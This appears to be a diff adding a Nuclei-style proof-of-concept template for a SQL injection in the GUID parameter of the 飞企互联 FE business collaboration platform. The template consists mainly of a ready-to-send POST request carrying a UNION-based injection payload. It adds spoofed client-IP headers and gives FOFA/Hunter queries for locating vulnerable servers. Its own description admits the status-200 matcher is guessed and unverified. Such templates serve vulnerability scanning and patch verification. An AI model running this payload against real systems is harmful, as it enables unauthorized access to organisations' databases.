@@ -1,0 +1,46 @@
+id: poc-07f2e1f02c754d12afd5
+info:
+  name: 飞企互联FE业务协作平台GUID存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/07f2e1f02c754d12afd53bd06e5a1670
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 07f2e1f02c754d12afd53bd06e5a1670
+    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
+http:
+- raw:
+  - 'POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Content-Length: 49
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Forwarded-For: 127.0.0.1
+
+    X-Originating-IP: 127.0.0.1
+
+    X-Remote-Addr: 127.0.0.1
+
+    X-Remote-IP: 127.0.0.1
+
+
+    option=2&GUID=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%2884%29%2BCHAR%2865%29%2BCHAR%28102%29%2BCHAR%28107%29%2BCHAR%28108%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%2865%29%2BCHAR%2869%29%2BCHAR%2872%29%2BCHAR%28100%29%2BCHAR%28103%29%2BCHAR%2888%29%2BCHAR%28113%29%2BCHAR%2884%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%2870%29%2BCHAR%28115%29%2BCHAR%2868%29%2BCHAR%2886%29%2BCHAR%2880%29%2BCHAR%28114%29%2BCHAR%2882%29%2BCHAR%28103%29%2BCHAR%28105%29%2BCHAR%28108%29%2BCHAR%28115%29%2BCHAR%28101%29%2BCHAR%2887%29%2BCHAR%2888%29%2BCHAR%2889%29%2BCHAR%28116%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28108%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2881%29%2BCHAR%2870%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29--+GDzH'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
